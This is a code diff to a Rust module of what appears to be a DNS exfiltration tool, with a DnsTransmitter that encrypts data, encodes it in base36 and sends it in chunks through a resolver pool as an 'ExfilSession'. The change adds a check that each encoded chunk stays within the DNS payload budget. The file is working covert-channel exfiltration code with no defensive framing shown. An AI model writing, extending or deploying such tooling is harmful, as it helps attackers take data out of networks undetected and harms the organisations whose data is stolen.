@@ -1,6 +1,7 @@
 use crate::base36;
 use crate::config::Config;
 use crate::crypto::{derive_key, encrypt};
+use crate::limits::{chunk_payload_budget_chars, encoded_len_for_payload};
 use crate::metadata::ExfilSession;
 use crate::resolver::ResolverPool;
 use anyhow::{anyhow, Context, Result};
@@ -59,6 +60,7 @@ impl DnsTransmitter {
 
     pub fn send_metadata_chunk(&mut self, session: &ExfilSession) -> Result<()> {
         let payload = build_metadata_payload(session);
+        ensure_payload_within_budget(payload.len())?;
         self.send_frame(session, FrameDescriptor::chunk(0), Some(&payload))
     }
 
@@ -66,6 +68,7 @@ impl DnsTransmitter {
         let frame_index = index
             .checked_add(1)
             .ok_or_else(|| anyhow!("chunk index overflow"))? as u32;
+        ensure_payload_within_budget(chunk.len())?;
         self.send_frame(session, FrameDescriptor::chunk(frame_index), Some(chunk))
     }
 
@@ -370,4 +373,18 @@ fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
         }
     }
     Ipv4Addr::from(octets)
+}
+
+fn ensure_payload_within_budget(bytes: usize) -> Result<()> {
+    let encoded = encoded_len_for_payload(bytes);
+    let budget = chunk_payload_budget_chars();
+    if encoded > budget {
+        return Err(anyhow!(
+            "payload of {} bytes expands to {} base36 chars (max {})",
+            bytes,
+            encoded,
+            budget
+        ));
+    }
+    Ok(())
 }
